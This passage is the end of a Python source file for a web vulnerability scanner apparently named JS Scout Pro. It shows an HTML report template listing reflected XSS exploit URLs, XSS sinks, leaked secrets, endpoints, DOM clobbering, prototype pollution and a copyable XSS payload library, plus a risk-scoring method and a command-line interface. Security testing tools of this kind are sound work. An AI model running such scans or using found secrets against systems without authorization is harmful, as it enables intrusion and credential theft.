  <div style="background:#0d1117;border:1px solid #1e2d3d;border-top:none;padding:20px;min-height:300px">

    <div id="tab-poc" class="tab on">
      {section("CONFIRMED REFLECTED XSS — EXACT VULNERABLE URLS", len(poc_findings))}
      <div style="font-size:11px;color:#6b8fa8;margin-bottom:16px">
        Each URL below directly triggers XSS in the browser. Click OPEN to verify,
        or COPY to share the exact exploit link. Shows which parameter is vulnerable.
      </div>
      {poc_section if poc_findings else '<div style="color:#3a5068;text-align:center;padding:40px">No reflected XSS found in URL params.<br><span style=\'font-size:11px\'>Check the XSS SINKS tab for DOM-based findings.</span></div>'}
    </div>

    <div id="tab-xss" class="tab">
      {section("XSS SINKS", summary["xss_findings"])}
      {xss_html or '<div style="color:#3a5068;text-align:center;padding:40px">No XSS sinks detected</div>'}
    </div>

    <div id="tab-secrets" class="tab">
      {section("SECRETS / CREDENTIALS", summary["secrets"])}
      {sec_html or '<div style="color:#3a5068;text-align:center;padding:40px">No secrets detected</div>'}
    </div>

    <div id="tab-endpoints" class="tab">
      {section("ENDPOINTS", summary["endpoints"])}
      <div style="padding:4px 0">
        {ep_rows or '<div style="color:#3a5068;text-align:center;padding:40px">No endpoints extracted</div>'}
      </div>
    </div>

    <div id="tab-dom" class="tab">
      {section("DOM CLOBBERING", summary["dom_clobber"])}
      {dom_html or '<div style="color:#3a5068;padding:20px">None detected</div>'}
      {section("PROTOTYPE POLLUTION", summary["proto_pollution"])}
      {proto_html or '<div style="color:#3a5068;padding:20px">None detected</div>'}
    </div>

    <div id="tab-payloads" class="tab">
      {section("XSS PAYLOAD LIBRARY", "click any to copy")}
      <div style="font-size:11px;color:#3a5068;margin-bottom:16px">
        Click any payload to copy it to clipboard. Use these to manually verify findings.
      </div>
      {pl_html}
    </div>

  </div>

</div>

<div id="notif">COPIED TO CLIPBOARD</div>

<script>
function showTab(name, btn) {{
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('on'));
  document.getElementById('tab-'+name).classList.add('on');
  btn.classList.add('on');
}}

function flashNotif(msg) {{
  var n = document.getElementById('notif');
  n.textContent = msg || 'COPIED';
  n.classList.add('show');
  setTimeout(function(){{ n.classList.remove('show'); }}, 1800);
}}

// SAFE delegated copy handler — reads from data-p attribute, never from innerHTML
document.addEventListener('click', function(e) {{
  var el = e.target.closest('.cp-row');
  if (!el) return;
  var text = el.dataset.p || '';
  navigator.clipboard.writeText(text).then(function() {{
    var cp = el.querySelector('.cp');
    if (cp) {{ cp.textContent = 'copied!'; setTimeout(function(){{ cp.textContent = '[ copy ]'; }}, 2000); }}
    flashNotif('COPIED');
  }}).catch(function() {{
    var ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
    flashNotif('COPIED');
  }});
}});
</script>
</body>
</html>'''

    def _calc_risk(self, r) -> str:
        if any(s['severity']=='CRITICAL' for s in r.get('secrets',[])):
            return 'CRITICAL'
        if r.get('secrets') or any(x.get('confirmed_flow') for x in r.get('xss_findings',[])):
            return 'HIGH'
        if r.get('xss_findings') or r.get('dom_clobber'):
            return 'MEDIUM'
        if r.get('endpoints'):
            return 'LOW'
        return 'INFO'


# =============================================================================
# CLI
# =============================================================================

def main():
    ap = argparse.ArgumentParser(description='JS Scout Pro')
    ap.add_argument('target')
    ap.add_argument('-o','--output',  default=None)
    ap.add_argument('-t','--threads', type=int, default=10)
    ap.add_argument('--timeout',      type=int, default=15)
    ap.add_argument('--pages',        type=int, default=200)
    ap.add_argument('--depth',        type=int, default=3)
    ap.add_argument('--cookies',      default=None)
    ap.add_argument('--header', action='append', dest='headers')
    ap.add_argument('--json', action='store_true')
    args = ap.parse_args()

    target = args.target
    if '://' not in target:
        target = 'https://' + target
    domain = urlparse(target).netloc.replace(':','_')
    output = args.output or f'jsscout_output/{domain}'

    hdrs = {}
    for h in (args.headers or []):
        if ':' in h:
            k,_,v = h.partition(':'); hdrs[k.strip()] = v.strip()

    scout = JSScout(target, output, threads=args.threads, timeout=args.timeout,
                    max_pages=args.pages, depth=args.depth,
                    cookies=args.cookies, extra_headers=hdrs or None)
    results = scout.run()
    if args.json:
        results['external_urls'] = list(results.get('external_urls',[]))
        print(json.dumps(results, indent=2, default=str))

if __name__ == '__main__':
    main()
